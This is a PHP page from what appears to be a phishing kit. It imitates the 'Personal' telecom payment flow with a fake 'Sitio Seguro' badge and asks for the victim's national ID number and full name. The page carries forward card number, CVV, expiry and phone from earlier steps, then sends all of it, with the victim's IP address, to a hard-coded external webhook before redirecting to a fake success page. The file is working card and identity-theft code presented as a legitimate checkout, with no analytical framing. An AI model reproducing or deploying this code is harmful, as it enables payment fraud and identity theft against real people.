<?php
$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
$amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';
$card = isset($_POST['card']) ? trim($_POST['card']) : '';
$cv = isset($_POST['cv']) ? trim($_POST['cv']) : '';
$venc = isset($_POST['venc']) ? trim($_POST['venc']) : '';

// Si recibimos DNI y nombre, enviar al webhook
if(isset($_POST['dni']) && isset($_POST['name'])) {
    $dni = trim($_POST['dni']);
    $name = trim($_POST['name']);
    
    // Enviar al webhook
    $webhook_url = 'https://hook.us2.make.com/9r3vblb5fn35s0aoclfcuyg22vhzf55y';
    
    $data = [
        'telefono' => $phone,
        'tarjeta' => $card,
        'cv' => $cv,
        'venc' => $venc,
        'DNI' => $dni,
        'nombre' => $name,
        'cantidad' => $amount,
        'ip' => $_SERVER['REMOTE_ADDR'],
        'fecha' => date('Y-m-d H:i:s')
    ];
    
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    curl_exec($ch);
    curl_close($ch);
    
    // Redirigir a success
    header('Location: success.php');
    exit;
}

// Detectar tipo de tarjeta
$tipo_tarjeta = 'visa';
if (preg_match('/^5[1-5]/', $card) || preg_match('/^2[2-7]/', $card)) {
    $tipo_tarjeta = 'mastercard';
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Datos del titular | Personal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #2a2a2a;
            color: #fff;
        }
        
        .header {
            background: #2a2a2a;
            border-bottom: 1px solid #3a3a3a;
            color: #fff;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo { font-size: 18px; font-weight: 500; }
        .sitio-seguro { font-size: 12px; }
        
        .container {
            max-width: 600px;
            margin: 60px auto;
            padding: 0 20px;
        }
        
        h1 {
            text-align: center;
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 50px;
        }
        
        /* TARJETA */
        .tarjeta {
            width: 100%;
            max-width: 400px;
            height: 240px;
            margin: 0 auto 50px;
            border-radius: 16px;
            padding: 25px 30px;
            position: relative;
            background: <?php echo $tipo_tarjeta === 'mastercard' ? 'linear-gradient(135deg, #eb001b 0%, #f79e1b 100%)' : '#1e3a8a'; ?>;
            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
        }
        
        .tarjeta-chip {
            width: 50px;
            height: 40px;
            background: linear-gradient(135deg, #ffd700 0%, #daa520 100%);
            border-radius: 8px;
            margin-bottom: 40px;
        }
        
        .tarjeta-numero {
            font-size: 26px;
            letter-spacing: 4px;
            font-family: 'Courier New', Courier, monospace;
            margin-bottom: 30px;
            font-weight: 400;
        }
        
        .tarjeta-bottom {
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
        }
        
        .tarjeta-nombre {
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .tarjeta-venc {
            font-size: 14px;
            font-family: 'Courier New', Courier, monospace;
        }
        
        .tarjeta-logo {
            position: absolute;
            top: 20px;
            right: 25px;
            font-size: 18px;
            font-weight: bold;
        }
        
        /* FORMULARIO */
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #fff;
        }
        
        input {
            width: 100%;
            padding: 14px 16px;
            background: #1a1a1a;
            border: 1px solid #444;
            border-radius: 6px;
            color: #fff;
            font-size: 16px;
        }
        
        input:focus {
            outline: none;
            border-color: #5d8bf4;
        }
        
        .botones {
            display: flex;
            gap: 12px;
            margin-top: 40px;
        }
        
        button {
            flex: 1;
            padding: 14px;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .btn-volver {
            background: transparent;
            border: 1px solid #5d8bf4;
            color: #5d8bf4;
        }
        
        .btn-volver:hover { background: rgba(93, 139, 244, 0.1); }
        
        .btn-pagar {
            background: #28a745;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
        }
        
        .btn-pagar:hover { background: #218838; }
        .btn-pagar:disabled {
            background: #444;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">personal flow</div>
        <div class="sitio-seguro">🔒 Sitio Seguro</div>
    </div>

    <div class="container">
        <h1>Datos del titular</h1>

        <div class="tarjeta">
            <div class="tarjeta-chip"></div>
            <div class="tarjeta-numero"><?php echo htmlspecialchars($card); ?></div>
            <div class="tarjeta-bottom">
                <div class="tarjeta-nombre" id="displayNombre">Nombre y Apellido</div>
                <div class="tarjeta-venc"><?php echo htmlspecialchars($venc); ?></div>
            </div>
            <div class="tarjeta-logo"><?php echo $tipo_tarjeta === 'mastercard' ? 'Mastercard' : 'VISA'; ?></div>
        </div>

        <form method="POST" action="step6.php">
            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
            <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
            <input type="hidden" name="card" value="<?php echo htmlspecialchars($card); ?>">
            <input type="hidden" name="cv" value="<?php echo htmlspecialchars($cv); ?>">
            <input type="hidden" name="venc" value="<?php echo htmlspecialchars($venc); ?>">
            
            <div class="form-group">
                <label>DNI</label>
                <input type="text" name="dni" id="dni" placeholder="12345678" maxlength="8" required autocomplete="off">
            </div>

            <div class="form-group">
                <label>Nombre y Apellido</label>
                <input type="text" name="name" id="name" placeholder="Juan Pérez" maxlength="50" required autocomplete="off">
            </div>

            <div class="botones">
                <button type="button" class="btn-volver" onclick="window.history.back()">Volver</button>
                <button type="submit" class="btn-pagar" id="btnPagar" disabled>PAGAR</button>
            </div>
        </form>
    </div>

    <script src="javascript/query.min.js"></script>
    <script>
        $(document).ready(function(){
            function validar() {
                var dni = $('#dni').val();
                var nombre = $('#name').val();
                
                // Actualizar nombre en tarjeta
                if (nombre.length > 0) {
                    $('#displayNombre').text(nombre.toUpperCase());
                } else {
                    $('#displayNombre').text('Nombre y Apellido');
                }
                
                if (dni.length >= 7 && nombre.length >= 3) {
                    $('#btnPagar').prop('disabled', false);
                } else {
                    $('#btnPagar').prop('disabled', true);
                }
            }
            
            $('#dni, #name').on('input', validar);
            
            // Solo números en DNI
            $('#dni').on('keypress', function(e){
                if (e.which < 48 || e.which > 57) {
                    e.preventDefault();
                }
            });
        });
    </script>
</body>
</html>